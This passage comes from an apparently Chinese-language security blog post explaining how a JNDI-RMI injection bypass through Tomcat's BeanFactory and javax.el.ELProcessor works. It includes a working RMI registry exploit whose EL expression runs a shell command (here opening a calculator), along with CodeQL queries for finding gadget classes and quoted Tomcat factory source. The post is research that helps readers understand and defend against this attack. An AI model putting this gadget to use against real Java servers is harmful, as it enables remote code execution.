&#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        PrivilegedAction var0 = () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> System.getProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        String var1 = (String)AccessController.doPrivileged(var0);</span><br><span class="line">        trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="TOMCAT-ELçš„ç»•è¿‡"><a href="#TOMCAT-ELçš„ç»•è¿‡" class="headerlink" title="TOMCAT ELçš„ç»•è¿‡"></a>TOMCAT ELçš„ç»•è¿‡</h3><p>éƒ½çŸ¥é“tomcat ELå¯ä»¥å®ç°ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.logCalls&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">// å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory</span></span><br><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">// å¼ºåˆ¶å°† &#x27;x&#x27; å±æ€§çš„setter ä» &#x27;setX&#x27; å˜ä¸º &#x27;eval&#x27;, è¯¦ç»†é€»è¾‘è§ BeanFactory.getObjectInstance ä»£ç </span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"><span class="comment">// åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;open -a calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure><h2 id="æ€è·¯é€†å‘åˆ†æ"><a href="#æ€è·¯é€†å‘åˆ†æ" class="headerlink" title="æ€è·¯é€†å‘åˆ†æ"></a>æ€è·¯é€†å‘åˆ†æ</h2><p>çŸ¥å…¶ç„¶æ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œè¿™ç§ç»•è¿‡æ–¹å¼ä½†æ˜¯å¦‚ä½•å‘ç°çš„å‘¢ï¼Ÿ</p><h3 id="ResourceRef-çš„å®šä½"><a href="#ResourceRef-çš„å®šä½" class="headerlink" title="ResourceRef çš„å®šä½"></a>ResourceRef çš„å®šä½</h3><p>ä»RegistryContext#decodeObject é™åˆ¶é€»è¾‘ä¸­å¯ä»¥çœ‹åˆ°ï¼Œjava.naming.Reference ç”¨ä¸äº†ï¼Œå› ä¸ºgetFactoryClassLocation è¿‡ä¸äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œè¿˜æœ‰å“ªäº›ç±»æ»¡è¶³</p><ol><li>ç»§æ‰¿Reference</li><li>getFactoryClassLocation å¯ä»¥ä¸ºnull</li></ol><p>å°è¯•æ‰¾ç»§æ‰¿Reference çš„å­ç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyReference extends ClassOrInterface&#123;</span><br><span class="line">MyReference()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;Reference&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass(Class m)&#123;</span><br><span class="line">m.getASupertype*() instanceof MyReference</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p>ç»“è®ºæ˜¯åœ¨tomcat-catalina ä¸­æ‰¾åˆ°äº†</p><ul><li><strong>org.apache.naming.ResourceRef</strong></li><li>org.apache.naming.LookupRef (å¯rmiè½¬ldapï¼Œä½œç”¨æœ‰é™)</li><li>org.apache.naming.HandlerRef</li><li>org.apache.naming.EjbRef</li><li>org.apache.naming.ResourceLinkRef</li><li>org.apache.naming.ResourceEnvRef</li><li>org.apache.naming.ServiceRef</li></ul><p>ä»¥ResourceRef ä¸ºä¾‹</p><h3 id="ReferenceWrapper-çš„å®šä½"><a href="#ReferenceWrapper-çš„å®šä½" class="headerlink" title="ReferenceWrapper çš„å®šä½"></a>ReferenceWrapper çš„å®šä½</h3><p>ResourceRef å®šä½åˆ°äº†ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥bind, å› ä¸ºjava.rmi.registry.Registry åªèƒ½bind Remoteç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœç†Ÿæ‚‰JNDI-RMI ä½ç‰ˆæœ¬æ³¨å…¥ï¼Œåº”è¯¥è®°å¾—è¿™ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>ç›´æ¥bind Exploit</li><li><strong>é€šè¿‡ReferenceWrapper(reference) å®ç°bind è¿œç¨‹ç›®æ ‡ç±»</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1. ç›´æ¥ç»‘å®šå­˜åœ¨æ¶æ„ä»£ç å—çš„ç±»å®ä¾‹</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, (Remote) <span class="keyword">new</span> Exploit());</span><br><span class="line"></span><br><span class="line">#2. reference</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://localhost:8000/&quot;</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ReferenceWrapper(ResourceRef) å¯ä»¥å—ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ResourceRef ç»§æ‰¿Referenceï¼Œå¯ä»¥</p><h3 id="BeanFactory-çš„å®šä½"><a href="#BeanFactory-çš„å®šä½" class="headerlink" title="BeanFactory çš„å®šä½"></a>BeanFactory çš„å®šä½</h3><p>å†å›é¡¾ä¸‹javax.naming.spi.NamingManager#getObjectInstance çš„è¿‡ç¨‹</p><ol><li>ref = (Reference) refInfo;</li><li>String f = ref.getFactoryClassName();</li><li>factory = getObjectFactoryFromReference(ref, f);</li><li>return factory.getObjectInstance(ref, name, nameCtx,  environment);</li></ol><p>ç»“åˆResourceRef çš„æ„é€ å‡½æ•°ä»¥åŠfactoryå±æ€§<br><code>public ResourceRef(String resourceClass, String description, String scope, String auth, boolean singleton, String factory, String factoryLocation) &#123;</code></p><p>é‚£ä¹ˆé—®é¢˜å°±æˆäº†ï¼šå¯»æ‰¾å¯åˆ©ç”¨çš„Factoryï¼Œéœ€è¦æ»¡è¶³</p><ol><li>ç»§æ‰¿Factory</li><li>getObjectInstance æœ‰å¯åˆ©ç”¨ç©ºé—´<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyFactory extends ClassOrInterface&#123;</span><br><span class="line">MyFactory()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;ObjectFactory&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass( Class m)&#123;</span><br><span class="line">m.getASourceSupertype() instanceof MyFactory</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure>æ‰¾æ‰¾tomcatä¸‹é¢ç¬¦åˆçš„Factoryï¼š</li></ol><ul><li>org.apache.naming.factory.BeanFactory</li><li>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</li><li>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</li><li>org.apache.tomcat.jdbc.pool.DataSourceFactory</li></ul><h4 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>éœ€è¦æœ‰æ— å‚æ„é€ å‡½æ•°</li><li>å¯ä»¥è°ƒç”¨ç¬¦åˆæ¡ä»¶çš„æ–¹æ³•ï¼Œè¦æ±‚æ–¹æ³•çš„å‚æ•°ä¸º1ä¸ªï¼Œç±»å‹ä¸ºString</li><li>è¿˜å¯ä»¥è°ƒç”¨set*æ–¹æ³•ï¼Œè¦æ±‚æ–¹æ³•çš„å‚æ•°ä¸º1ä¸ªï¼Œç±»å‹ä¸ºString</li><li>ä»¥ä¸Šæ–¹æ³•éƒ½è¦æ±‚public</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    String beanClassName = ref.getClassName();</span><br><span class="line">    ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. åå°„è·å–ç±»å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. åˆå§‹åŒ–ç±»å®ä¾‹</span></span><br><span class="line">    Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æ ¹æ® Reference çš„å±æ€§æŸ¥æ‰¾ setter æ–¹æ³•çš„åˆ«å</span></span><br><span class="line">    RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    String value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å¾ªç¯è§£æåˆ«åå¹¶ä¿å­˜åˆ°å­—å…¸ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. è§£ææ‰€æœ‰å±æ€§ï¼Œå¹¶æ ¹æ®åˆ«åå»è°ƒç”¨ setter æ–¹æ³•</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        String propName = ra.getType();</span><br><span class="line">        String value = (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">        Method method = forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory"><a href="#org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory"></a>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>å¦‚æœæœ‰æœ¬åœ°Gadgetsï¼Œå¯ä»¥ååºåˆ—åŒ–ï¼Œé¸¡è‚‹</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(<span class="keyword">final</span> Object refObj, <span class="keyword">final</span> Name name, <span class="keyword">final</span> Context context,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">final</span> Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// The spec says to return null if we can&#x27;t create an instance</span></span><br><span class="line">    <span class="comment">// of the reference</span></span><br><span class="line">    Object obj = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refObj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        <span class="keyword">final</span> Reference ref = (Reference) refObj;</span><br><span class="line">        <span class="keyword">if</span> (isCorrectClass(ref.getClassName())) &#123;</span><br><span class="line">            <span class="keyword">final</span> RefAddr refAddr = ref.get(<span class="string">&quot;instanceKey&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// object was bound to JNDI via Referenceable API.</span></span><br><span class="line">                obj = instanceMap.get(refAddr.getContent());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Tomcat JNDI creates a Reference out of server.xml</span></span><br><span class="line">                <span class="comment">// &lt;ResourceParam&gt; configuration and passes it to an</span></span><br><span class="line">                <span class="comment">// instance of the factory given in server.xml.</span></span><br><span class="line">                String key = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    key = name.toString();</span><br><span class="line">                    obj = instanceMap.get(key);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> InstanceKeyDataSource ds = getNewInstance(ref);</span><br><span class="line">                    setCommonProperties(ref, ds);</span><br><span class="line">                    obj = ds;</span><br><span class="line">                    <span class="keyword">if</span> (key != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        instanceMap.put(key, ds);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setCommonProperties</span><span class="params">(<span class="keyword">final</span> Reference ref, <span class="keyword">final</span> InstanceKeyDataSource ikds)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    RefAddr refAddr = ref.get(<span class="string">&quot;dataSourceName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDataSourceName(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;description&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDescription(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized = (<span class="keyword">byte</span>[]) refAddr.getContent();</span><br><span class="line">        ikds.setJndiEnvironment((Properties) deserialize(serialized));</span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(data));</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException ex) &#123;</span><br><span class="line">                <span class="comment">// ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory"><a href="#org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory" class="headerlink" title="org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"></a>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>éœ€è¦æœ‰æ— å‚æ„é€ å‡½æ•°</li><li>å¯ä»¥è°ƒç”¨set*æ–¹æ³•ï¼Œè¦æ±‚æ–¹æ³•çš„å‚æ•°ä¸º1ä¸ªï¼Œç±»å‹ä¸ºString/Int/Long/Boolean/InetAddress</li><li>ä»¥ä¸Šæ–¹æ³•éƒ½è¦æ±‚public<br>ä¸å¦‚BeanFactoryï¼Œé¸¡è‚‹</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    Enumeration&lt;RefAddr&gt; refs = ref.getAll();</span><br><span class="line">    String type = ref.getClassName();</span><br><span class="line">    Object o =</span><br><span class="line">        ClassLoaderUtil.loadClass(</span><br><span class="line">            type,</span><br><span class="line">            GenericNamingResourcesFactory.class.getClassLoader(),</span><br><span class="line">            Thread.currentThread().getContextClassLoader()).getConstructor().newInstance();</span><br><span class="line">    <span class="keyword">while</span> (refs.hasMoreElements()) &#123;</span><br><span class="line">        RefAddr addr = refs.nextElement();</span><br><span class="line">        String param = addr.getType();</span><br><span class="line">        String value = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr.getContent()!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            value = addr.getContent().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProperty(o, param, value)) &#123;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Property not configured[&quot;</span>+param+<span class="string">&quot;]. No setter found on[&quot;</span>+o+<span class="string">&quot;].&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-pool-DataSourceFactory"><a href="#org-apache-tomcat-jdbc-pool-DataSourceFactory" class="headerlink" title="org.apache.tomcat.jdbc.pool.DataSourceFactory"></a>org.apache.tomcat.jdbc.pool.DataSourceFactory</h4><p>åˆ©ç”¨è¦æ±‚æ€»ç»“ï¼š</p><ol><li>å¦‚æœåœ¨rmiæœ‰é™åˆ¶urlçš„æƒ…å†µï¼Œå¯ä»¥è½¬jndi-ldapè¿›è¡Œæ”»å‡»</li></ol><p>ä¸å¦‚BeanFactoryï¼Œé¸¡è‚‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception 